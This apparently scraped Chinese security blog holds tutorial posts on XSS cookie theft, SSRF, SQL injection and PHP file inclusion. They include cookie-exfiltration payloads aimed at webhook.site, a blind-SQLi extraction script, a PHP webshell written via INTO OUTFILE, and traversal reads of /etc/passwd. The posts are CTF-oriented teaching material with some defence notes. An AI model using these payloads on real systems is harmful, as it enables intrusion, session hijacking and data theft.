是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等。其是一种白名单策略，当有非白名单允许的js脚本出现在页面中，浏览器会阻止脚本的执行 cookie外带 XSS靶场中通常以前端检测网页是否弹窗来判断有没有被XSS，但比赛/实战中，通常以XSS真实场景，需要外带出Cookie 带出cookie（通常对+进行编码%2B） fetch()方法 fetch() 允许 JavaScript 发送 HTTP 请求。如果 credentials: 'include'，则可以携带当前站点的 Cookie fetch(//webhook.site/xxxxxxxx/?cookie=+document.cookie) window.open方法 window.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象 例如，以下代码将会在新窗口或新标签页中打开指定 URL： window.open(//webhook.site/xxxxxxxx/?cookie=+document.cookie); XHR方法 XMLHttpRequest 是浏览器提供的内建 JavaScript 对象，用于在不刷新页面的情况下与服务器进行 HTTP 通信。它是早期 AJAX 技术的核心 scriptvar xhr = new XMLHttpRequest();xhr.open(GET, //webhook.site/xxxxxxxx/?cookie= %2BencodeURIComponent(document.cookie), true);xhr.send();/script XMLHttpRequest 对象 scriptvar xhr = new XMLHttpRequest(); xhr.open(GET, //webhook.site/xxxxxxxx/?cookie=+document.cookie, true); xhr.send();/script window.location 对象 window.location 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如 scriptwindow.location=//webhook.site/xxxxxxxx/?cookie=+document.cookie;/script 下面是window.location 对象中可用于跳转的方法 window.location.href window.location.href = //webhook.site/xxxxxxxx/?cookie=+document.cookie; window.location.assign(url)、window.location.replace(url)同上 document.write方法 利用 document.write 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口 document.write(`img src=//webhook.site/xxxxxxxx/?cookie=$document.cookie `) document.write(img src=//webhook.site/xxxxxxxx/?cookie=+document.cookie+/) XSS的防范 HttpOnly Cookie 设置 Cookie 为 HttpOnly，这样，JavaScript 无法 通过 document.cookie 访问该 Cookie，只能通过HTTP请求发送给服务器 绕过 绕过方式 说明 CSRF (跨站请求伪造) HttpOnly 不能防止跨站请求伪造攻击（CSRF），攻击者仍可在受害者的浏览器中发起请求，利用受害者的 Cookie 进行操作 XS-Leaks（跨站信息泄露） 通过 img、iframe、fetch() 发送请求，并观察返回数据是否有差异，可能间接推测出 Cookie 值 服务器端获取 Cookie 通过 XSS 劫持会话，让受害者访问恶意页面，然后读取本地存储的 Token 或 触发服务器端请求 来利用 Cookie 输入验证和转义 输入验证：限制输入字符，只允许安全字符（如 a-zA-Z0-9） HTML转义：实体编码 防止恶意脚本被注入到网页中 绕过 绕过方式 说明 双重编码绕过 有些 WAF 只转义了一次，可以尝试 scriptalert(1)/script 让服务器误解 事件属性绕过 如果 script 被拦截，可以尝试 img src=x onerror=alert(1) DOM XSS 如果后端转义了，但前端用 innerHTML 渲染数据，仍然可以执行 XSS 代码 JSON 解析漏洞 JSON 可能会反序列化恶意代码，例如 data: scriptalert(1)/script 使用 CSP（内容安全策略） 限制页面中允许执行的脚本来源，防止外部 XSS 代码注入 绕过 绕过方式 说明 JSONP 绕过 某些 API 允许 JSONP 请求，仍可执行外部代码 内联事件监听 onclick=alert(1) 可能仍然有效 数据 URI 绕过 某些 data: 方案仍然可以执行代码 动态 JavaScript 执行 eval(), setTimeout(), Function() 可能仍然可以执行恶意代码 Cookie SameSite 属性 限制 Cookie 的跨站点发送行为 绕过 绕过方式 说明 CORS 配合 XSS 绕过 如果 Access-Control-Allow-Origin: *，可以用 fetch() 请求获取敏感数据 站内跳转绕过 SameSite=Lax 允许 GET 请求，所以可以诱导用户点击链接 参考文章： 对于XSS跨站脚本攻击的学习-先知社区 前端安全之 CSP 及其常见绕过 BUUCTF上的XSS靶场","tags":["漏洞","XSS"],"categories":["漏洞"]},{"title":"SSRF漏洞","path":"/2025/07/09/SSRF漏洞/","content":"SSRF漏洞 基础知识 概述 SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统) 大白话：利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击 主要攻击方式 当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的 示例： 漏洞场景：某网站有一个在线加载功能可以把指定的远程文章加载到本地，链接如下： http://www.xxx.com/article.php?url=https://blog.csdn.net/qq_43531669/article/details/112498646 假如系统没有对url参数进行任何的检查，就可以构造其他的请求，例如： http://www.xxx.com/article.php?url=http://127.0.0.1:22http://www.xxx.com/article.php?url=file:///etc/passwdhttp://www.xxx.com/article.php?url=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)http://www.xxx.com/article.php?url=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求) 原理 SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器获取数据的功能但没有对目标地址做过滤与限制。攻击者可以利用改漏洞获取内部系统的一些信息（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网系统） 很多网站提供了从其他的服务器上获取数据的功能。通过指定的URL，网站可以从其他地方获取图片、下载文件、读取文件内容等。 SSRF的实质就是利用存在缺陷的Web站点作为代理攻击远程和本地的服务器。 危害 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。 攻击运行在内网或本地的应用程序。 对内网Web应用进行指纹识别，识别企业内部的资产信息。 攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。 利用file、gopher、dict协议读取本地文件、执行命令等 http://localhost:6379/（Redis 默认端口） http://127.0.0.1:3306/（MySQL 默认端口） http://192.168.0.1:8000/（常见的内网 Web 服务端口） 漏洞检测 漏洞验证 通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。 在页面源码中查找访问的资源地址，如果该资源地址类型为http://www.xxx.com/a.php?image=地址就可能存在SSRF漏洞 漏洞可能出现点 分享功能 http://share.xxx.com/index.php?url=http://www.xxx.com 通过url参数的获取来实现点击链接的时候跳到指定的分享文章 图片加载/下载 http://image.xxx.com/image.php?image=http://www.xxx.com 图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址 图片/文章收藏功能 http://title.xxx.com/title?title=http://title.xxx.com/xxx 例如 title参数是文章的标题地址，代表了一个文章的地址链接，如果收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF 转码服务 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译 给网址翻译对应网页的内容 邮件系统 比如接收邮件服务器地址 从URL关键字中寻找 share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain 绕过 部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理 常见限制 1.限制为http://www.xxx.com域名 采用http基本身份认证的方式绕过。即@ http://www.xxx.com@www.xxc.com 2.限制请求IP不为内网地址 当不允许ip为内网地址时 （1）采取短网址绕过 （2）采取特殊域名 （3）采取进制转换 3.限制请求只为http协议 （1）采取302跳转 （2）采取短地址 绕过限制为某种域名 @绕过 当网站限制只能访问 http://www.xxx.com类型的域名时，可以采用http基本身份认证的方式绕过 如：http://www.xxx.com@www.xxc.com 在对@解析域名中，不同的处理函数存在处理差异，例如： http://www.aaa.com@www.bbb.com@www.ccc.com 在PHP的parse_url中会识别 www.ccc.com，而libcurl则识别为 www.bbb.com 要求URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧 构造payload： ?url=http://notfound.ctfhub.com@127.0.0.1/flag.php 如果要求以http://notfound.ctfhub开头.com 结尾的话，依旧可以使用@ payload ?url=http://notfound.ctfhub@127.0.0.1/flag.php.com 或者： ?url=http://ctf.@127.0.0.1/flag.php#show 此类需要某某开头 某某结束的题目均可使用@进行绕过 绕过限制请求IP不为内网地址 利用句号 127。0。0。1 127.0.0.1 利用[::] 可以利用[::]来绕过localhost http://[::]:80/ http://127.0.0.1 添加端口号 http://127.0.0.1:8080 利用短网址 短网址 使用解析到内网的域名 如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。 另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1 xip.io 是一个通配符 DNS 解析服务，它可以将特定格式的域名解析为任意 IP 地址，常用于开发和内网测试 采用进制转换 若对IP进行正则过滤，可以通过改写IP形式来绕过 对于这种过滤我们采用改编IP的写法的方式进行绕过，例如127.0.0.1这个IP地址可以被改写成： 十进制整数表示 2130706433 八进制表示 0177.0.0.01 十六进制表示 0x7F000001 混合进制 127.0x0.1 127.1 0x7f.1 访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。 另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏 302跳转 限制请求只为http协议时使用 生成302跳转地址 限制请求只为http协议 采用302跳转 采用短地址 回环地址绕过 回环地址不止127.0.0.1，这便有了很大的操作空间 url=http://0/flag.phpurl=http://0.0/flag.phpurl=http://sudo.cc/flag.phphttp://localhost/http://[0:0:0:0:0:ffff:127.0.0.1]/http://①②⑦.⓪.⓪.① 利用URL伪协议 Gopher协议（万能协议） gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击 file协议 读取文件很好用 在有回显的情况下，利用 file 协议可以读取任意内容 file://var/www/html/flag.php dict协议 dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测安装软件版本信息，查看端口，操作内网redis服务 协议格式：dict://host:port/dict-path 一般用dict://host:port/info 探测端口应用信息 dict://127.0.0.1:6379 //探测redis是否存活dict://127.0.0.1:6379/info //探测端口应用信息 漏洞利用 产生漏洞的函数 SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取 file_get_contents() file_get_contents函数可以对本地文件进行读取，也可以对远程文件进行读取 条件 PHP 4 = 4.3.0, PHP 5, PHP 7, PHP 8 利用 ?php$url = $_GET[url];;echo file_get_contents($url);? 这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法 比如：下面的代码执行结果是输出test.txt文件里面的字符串 ?phpecho file_get_contents(“test.txt”);? fsockopen() 条件 PHP 4, PHP 5, PHP 7, PHP 8 利用 ?php function GetFile($host,$port,$link) $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) echo $errstr (error number $errno) ; else $out = GET $link HTTP/1.1\\r ; $out .= Host: $host\\r ; $out .= Connection: Close\\r \\r ; $out .= \\r ; fwrite($fp, $out); $contents=; while (!feof($fp)) $contents.= fgets($fp, 1024); fclose($fp); return $contents; ? fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限 curl_exec() 条件 PHP 4 = 4.0.2, PHP 5, PHP 7, PHP 8 利用 ?php if (isset($_POST[url])) $link = $_POST[url]; $curlobj = curl_init();// 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项 $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器 curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源 $filename = ./curled/.rand()..txt; file_put_contents($filename, $result); echo $result;? curl_exec函数用于执行指定的cURL会话 1.一般情况下PHP不会开启fopen的gopher wrapper 2.file_get_contents的gopher协议不能URL编码 3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 5.curl_exec() //默认不跟踪跳转， 6.file_get_contents() // file_get_contents支持php://input协议 步骤 把url中的内容改成内网的其他服务器上地址和端口，探测内网信息，比如端口开放情况 ?url=http://127.0.0.1:22 再打开Burp，抓包发到Intruder，设置Payload（端口处） 爆破，检测到了内网主机的80端口（例子）是开放的 也可以通过SSRF漏洞读取内网服务器的文件，例如将url修改为 ?url=file:///c:/windows/system.ini 防御SSRF 禁止跳转 禁用除http和https外的协议，如：file://、gopher://、dict://等。 限制请求的端口为http常用的端口，如 80、443、8080。 统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。 对请求地址设置白名单或者限制内网IP，以防止对内网进行攻击。 参考： SSRF入门-Pax SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） SSRF漏洞原理解析[通俗易懂]-腾讯云","tags":["漏洞","SSRF"],"categories":["漏洞"]},{"title":"SQL手工注入基本步骤","path":"/2025/07/09/SQL注入/","content":"SQL手工注入基本步骤 注入姿势 步骤 1.寻找注入点（和数据库有交互的地方）与数据传输的类型 登录，注册，搜索框 2.判断闭合方式 先判断是数字型还是字符型 ?id=1a：数字型：报错 字符型：正常 再判断闭合方式（字符型） ?id=1a (先加单引号，再加双引号，直到报错) 注意：‘’、“”、 ()、都是成双成对 验证输入内容数据库能否执行(加单引号让SQL语句发生错误，破坏SQL语句的完整性，没有达到SQL语句语法规则，从而判断可实现sql注入) ?id=1 and 1=1 #页面返回正常?id=1 and 1=2 #页面返回异常或?id=1 or 1=2 #页面返回正常?id=1 or 1=1 #页面返回异常 如果发现一开始页面先是正常然后是异常的话，说明页面存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的 先按报错法找到可能的闭合方式，在加注释看哪个闭合方式可以正常访问 3.查询字段数目 ?id=1 order by 3 # 默认按照升序对记录进行排序，可用desc关键字按照降序对记录进行排序 order by后面的列数大于实际的列数就会报错 联合查询注入 注意：UNION 操作符用于合并两个或多个 SELECT 语句的结果 判断回显（假设3列） ?id=-1 union select 1,2,3 # 触发错误的方式：-1’、 1’ and 1=2、 1’ or 1=1 爆破数据(假设回显位为2) 数据库名 ?id=-1 union select 1,database(),3 # 查表名 ?id=-1 union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema=database() # 查列名 ?id=-1 union select 1, group_concat(column_name) ,3 from information_schema.columns where table_name=表名 # 具体数据 ?id=-1 union select 1,group_concat(列名1,列名2) ,3 from 表名 # 一些默认数据库有关知识 table_schema：数据库名 table_name：表名 column_name：列名 information_schema.tables：数据库的表名 information_schema.columns：数据库的列名 limit m,n m：是指记录开始的位置，从0开始，表示第一条记录 n：是指取n条记录 limit 0,1 表示从第一条记录开始，表示取第一条记录 一些常见函数 1.concat：将多个字符串连成一个字符串 concat(str1，str2) 返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null 2.concat_ws：concat特殊形式，多了个分隔符 concat_ws(separator,str1,str2,…) 在处理 NULL值时不会返回 NULL 3.group_concat()：将多行结果连接为一行字符串 4.substr：用来截取数据库某个字段中的一部分 substr(string，start，length) 例如，获取 column_name 列的前 10 个字符 select substr(列名, 1, 10) from 表名 5.ascii：返回字符串str最左边的数值 ascii(str) 报错注入 通过特殊函数错误使用并使其输出错误结果来获取信息 报错注入为啥会回显？ 因为有字符（如~）不满足xml的格式导致报错 在遇有报错回显但没数据回显时可利用 报错注入函数 floor():向下取整 ?id=1 and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) # //获取数据库名 extractvalue():对XML文档进行查询的函数，当参数格式不正确而产生的错误，会返回参数的信息 语法：extractvalue(XML_document,XPath_string); payload： and (extractvalue(1,concat(0x7e,select database()),0x7e)) 注：其一次只能查询32位长度 updatexml():更新XML文档的函数，原理和extractvalue一样 语法：updatexml(XML_document,XPath_string,new_value); payload： updatexml(1,concat(0x7e,(select database()),0x7e),1) exp():以e为底的指数函数 1.爆数据库名 and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1) 2,爆表名 and updatexml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31)),1) # 3.爆列名 and updatexml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_name=表名),1,31)),1) # 4.爆值 and updatexml(1, concat(0x7e, mid((select group_concat(列1,0x3a,列2) from 表名),1,31)),1) # 盲注 看不到返回数据情况下通过差异（包括运行时间的差异和页面返回结果的差异）来判断 布尔盲注 在页面中，正确执行和错误执行SQL语句返回页面不一样，基于两种页面，来判断SQL语句正确与否，达到获取数据的目的 几个盲注函数 length()：返回字符串的长度 limit(a,b)：从第（a+1）行开始，取数量为b行的数据 substr()：截取字符串 ascii()：返回字符的ascii码，其同名函数ord用于过滤ascii的过滤 left(a,b)：从左侧截取a的前b位 判断数据库的长度： id=1 and (length(database())3) 判断数据库的具体名称： id=1 and (ascii(substr(database(),x,1))110) 判断表的个数： id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))0//上例若x=0则用来判断是否存在表 判断表的长度： id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))=4//上例用来判断第（x+1）个表长度是否为4 判断表名： id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110//上例用来判断第（x+1）个表的第y个字符ascii码是否为110 判断列的个数： id=1 and (select count(column_name) from information_schema.columns where table_name=flag)=1//上例用来判断flag表的列数 判断列的长度： id=1 and ascii(substr((select column_name from information_schema.columns where table_name = flag), 4,1)) 判断列名： id=1 and ascii(substr((select column_name from information_schema.columns where table_name = flag), 1,1))=102 查值（虚拟机中）： sqlmap -r 1.txt --technique B -D web -T flag -C value --dump --level 3 --risk 3 时间盲注 通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态 sleep()：将程序挂起n秒后响应 if(expr1,expr2,expr3)：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3 判断注入点： ‘ and sleep(5) # 判断数据库的长度： id=1 and if(length(database())=4,sleep(3),1) 判断数据库的具体名称： id=1 and if(ascii(substr(database(),x,1))110,sleep(3),1) 判断表的个数： id=1 and if((select count(table_name) from information_schema.tables where table_schema=database())=x,sleep(3),1) //这里的x从1开始判断数据库中存在的表的数量 判断表名： id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110,sleep(3),1) 判断列的个数： id=1 and if((select count(column_name) from information_schema.columns where table_name=flag)=x,sleep(3),1) //这里的x从1开始判断flag表中存在的字段数量 判断列名： id=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=flag),x,1))=xxx,sleep(3),1)//这里的x是从1开始判断字段的位置，xxx对应了具体的ascii值 查值（虚拟机中）： sqlmap -r 1.txt --technique T -D web -T flag -C value --dump --level 3 --risk 3 时间盲注脚本（post型） import requestsimport stringimport time#配置目标 URL 和基础信息url = ........username_template = or if((select substr(value,index,1) from flag)=char,sleep(3),0)##填写payloadpassword = 0#用于测试的字符集（可以根据实际情况扩展）charset = string.ascii_letters + string.digits + _-def time_blind_injection(): extracted_value = index = 1 # 从第1个字符开始 while True: found = False for char in charset: payload = username_template.format(index=index, char=char) start_time = time.time() # 发送 POST 请求 response = requests.post(url, data=username: payload, password: password) elapsed_time = time.time() - start_time # 判断响应时间是否超过3秒 if elapsed_time 3: extracted_value += char print(f[+] Found character at position index: char) found = True break if not found: # 如果在当前索引没有找到字符，说明到达字符串末尾 print([+] Extraction complete!) break index += 1 return extracted_value if __name__ == __main__: print([*] Starting time-based blind SQL injection...) result = time_blind_injection() print(f[+] Extracted value: result) 盲注更提倡用sqlmap自动化 堆叠查询注入 堆叠查询可以执行多条语句，多条语句间以分号隔开 例如php中的**mysql_multi_query()，pymysql中的cursor.execute()**支持多条sql语句同时执行 查数据库： 0;show databases;# 查表： 0;show tables;# 查列： 0;show columns from 表名;#或0;desc 列名;# 查数据(使用预处理语句)： //select被绕过时，使用concat函数将select进行连接过滤0;sEt@a=concat(sel,ect 列名 from 表名);PRepare hello from @a;execute hello;# 更新注入 更新类的操作的返回结果都是布尔型，无法返回数据 insert into user(username,password,role) values(admin or updatexml(1, concat(0x7e, database(), 0x7e), 1) or , passwd, editor) update user set password = ikun666 where id = 9 or extractvalue(1, concat(0x7e, version(), 0x7e)); 二次注入 二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行 利用条件：知道数据库中的列名且使用了magic_quote_gpc等对引号过滤 例如存在注册和登录两个点击框，在注册的时候添加一些特殊字符，创建成功后，登录进行修改密码，发现报错语句，这里就可以判定是存在二次注入的，在注册的时候写入，然后再修改密码的地方修改密码后触发，这样就导致错误的输出，这里有错误的回显就可以使用报错注入来进行注入 HTTP头注入 HTTP头部注入是通过HTTP协议头部字段值进行注入，常存在于referer、X-Forwarded-For、Cookie、X-Real-IP、Accept-Language、Authorization，User-Agent User-Agent注入 判断注入点：user-agent值后面加上'，引发报错，确定存在sql注入 采用报错注入函数获取当前数据库名 and updatexml(1,concat(0x7e,(database()),0x7e),0) and cookie注入 采用联合注入或报错注入 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=数据库名 剩下的就是需要查询表中的字段和字段的详细信息，和普通SQL注入同理 Referer注入 XFF注入 宽字节注入 利用条件：数据库使用了GBK编码，使用magic_quotes_gpc对引号过滤 magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’',来做一定的过滤 \\的编码是%5c,输入%df'，经过过滤处理后会变成%df\\'也就是%df%5c，GBK编码中文字符’運’ 原理：汉字url编码2位，利用汉字的一半编码与/组合过滤 接着与正常注入步骤一样 ?id=-1%df%27 union select 1,2,database()%23 但后续查表会出现单引号（但其会被转义），用嵌套查询 ?id=20%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())%23 ?id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema = (select database()) and table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0, 1)limit 0,1 %23 二次编码注入 利用条件：目标站点使用了urldecode()解码 %的url编码为：%25 '的url编码为：%27 %25%27，URL解码后是%27 也就是' MySQL写入webshell 拿下数据库后如果有权限的话可以读取文件或者写入webshell 利用前提 1.secure_file_priv为空 show global variables like %secure% secure_file_priv = 任意路径读写 secure_file_priv = path 只能在该指定路径下读写 secure_file_priv = null 不能读写 2.具有写入文件权限 3.知道网站绝对路径 写入文件 使用into outfile()将一句话写入网站目录 select ?php eval($_POST[cmd];?) into outfile \\/var\\/www\\/html\\/shell.php; 读取文件 使用load_file()函数读取文件 ?id=-1 union select 1,2,load_file(//etc//passwd) 绕过方式 注释符 #, --+, -- -, %23, %00, /**/ #一般在post传参，%23一般在get传参 and，or 过滤 # 可以使用和||代替?id=1 1=1 --+ # 盲注，异或运算相同为0，不同为1；根据返回值0，1判断?id=1 union select (substr(database(),1,1)=s) ^ 0 -- 关键词绕过 大小写绕过 id=-1 UnIoN SeLeCT xxx 双写绕过 id=-1UNIunionONSeLselectECT1,2,3–- 编码绕过 可以使用URL，hex，ASCII等编码绕过 例如’or 1=1可用27%20%4F%52%201%3D%31%20%2D%2D 注释绕过 内联注释/**/将关键词分隔开 UN/**/ION SE/**/LECT 空格绕过 内联注释代替空格 id=1/**/and/**/1=1 括号嵌套 select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database()); 制表符、换行、不可见空格 %09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)%0c(换页符),%20(空格) 反引号 union(select`table_name`,`table_type`from`information_schema`.`tables`); =被过滤 可以用like(其子句中用%来表示任意字符)或rlike，也可以用regexp(不区分大小写，若需要大小写敏感，加binary)来绕过 比如=‘admin’ 就可以like ‘admin’ 逗号过滤 逗号被过滤时可以使用from...for... select substr(select database() from 1 for 1); limit中的逗号可以替换成offset select * from users limit 1 offset 2; limit 1,2 是从第一行往后取2行（包括第一行和第二行) limit 1 offset 2是从第一行开始只取第二行 False注入 select * from users where username = 0; # 查询表中所有数据 其实是利用了mysql的隐式类型转换，当字符串与数字比较时，会将字符串转换为浮点数，转换失败并返回0，0 = 0返回True，就会返回表中所有数据 绕过引号构造0的方法 select * from users where username = +;select * from users where username = -;select * from users where username = *;select * from users where username = %1#;select * from users where username = /6#; 等价函数 if()与 case…when…then…else…end 0 or if((ascii(substr((select database()),1,1))97),1,0)#=0 or case when ascii(substr((select database()),1,1))97 then 1 else 0 end# sleep()与benchmark() benchmark()函数用来测试执行速度，第一个参数代表执行的次数，第二个参数代表要执行的表达式或函数，根据执行的时间来判断 ?id=1 AND BENCHMARK(5000000, MD5(test)) concat_ws()与group_concat() select group_concat(database());=select concat_ws(1,database()); substr()与substring()/ipad()/rpad()/left()/mid() 参考： SQL注入利用及绕过","tags":["漏洞","SQL"],"categories":["漏洞"]},{"title":"PHP文件包含漏洞","path":"/2025/07/09/PHP文件包含漏洞/","content":"PHP文件包含漏洞 基础知识 概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行 “包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞 相关函数 include， require require报错会终止程序，但是include会继续执行下面代码。 include_once ，require_once 包含过的就不会继续包含 漏洞类型 LFI(Local File Inclusion) 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI RFI(Remote File Inclusion) 远程文件包含漏洞，指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大 RFI对php.ini里的配置有些要求： allow_url_fopen = On allow_url_include = On allow_url_fopen 允许 PHP 读取远程文件 allow_url_include 则允许 PHP 在代码中包含远程文件 注：在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off 测试 如果目标服务器配置允许远程文件包含（allow_url_include=On），可以尝试包含远程文件，例如： http://example.com/index.php?page=http://attacker.com/shell.txt 如果服务器加载了远程文件的内容，说明存在远程文件包含漏洞 用/etc/passwd来检验漏洞存在 常见的测试文件包括： /etc/passwd（Linux系统用户信息） /etc/hosts（主机名配置） /proc/self/environ（环境变量） Apache/Nginx日志文件（如/var/log/apache2/access.log） /etc/passwd 文件包含 root: 关键字，如果返回 root:x:0:0: 说明读取成功 路径遍历 http://target.com/index.php?file=../../../../../../etc/passwd 也可用python脚本 import requests# 目标 URLurl = http://target.com/index.php?file=# 常见的 LFI 路径遍历payloads = [ ../../../../../../etc/passwd, ..//..//..//..//..//..//etc/passwd, # 双斜杠绕过 ....//....//....//....//etc/passwd, # 多点斜杠绕过]# 发送请求for payload in payloads: full_url = url + payload response = requests.get(full_url) if root:x:0:0: in response.text: print(f[+] 成功！LFI 存在: full_url) print(response.text[:200]) # 仅显示部分内容 break else: print(f[-] 失败: full_url) 利用 php://filter 进行 Base64 编码 http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd Null Byte 截断（PHP 5.3.4） 如果服务器强制 .php 后缀： http://target.com/index.php?file=../../../../../etc/passwd%00 PATH_INFO 截断 http://target.com/index.php?file=../../../../../../etc/passwd.................... 包含方法 php伪协议 1 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I/O streams)5 zlib:// — 压缩流6 data:// — 数据(RFC 2397)7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流 file:// 访问本地文件系统，若不加协议名称，默认封装协议为file://协议 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 用于访问本地文件系统（服务器中的文件） 在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 注：使用file协议时无法使用相对路径 cmd=file://flag #用法错误，声明file协议时无法使用相对路径cmd=file:///flag #用法正确，使用绝对路径cmd=/flag #用法正确，使用绝对路径cmd=flag #用法正确，使用相对路径 使用实例 #Linuxcmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件cmd=flag #当前目录下的flag文件#Windowscmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件cmd=file://C:\\path\\to\\flag #C盘中path文件夹中to文件夹下flag文件cmd=C:\\path\\to\\flag #C盘中path文件夹中to文件夹下flag文件cmd=flag #当前文件夹下flag文件 http:// 访问 HTTP(s) 网址 条件 allow_url_fopen:on allow_url_include:on 作用 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含 使用实例 cmd=http://example.com/phpinfo.txt #读取http://example.com/phpinfo.txt文件cmd=https://example.com/file.php?var1=val1var2=val2 #读取https://example.com/file.php文件并且传入var1和var2的值 php:// 访问各个输入/输出流(I/O streams)，伪协议提供了多种不同的方式来访问和处理数据 常见 php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。php://stdin #用于访问标准输入流。php://stdout #用于访问标准输出流。php://stderr #用于访问标准错误输出流。php://temp 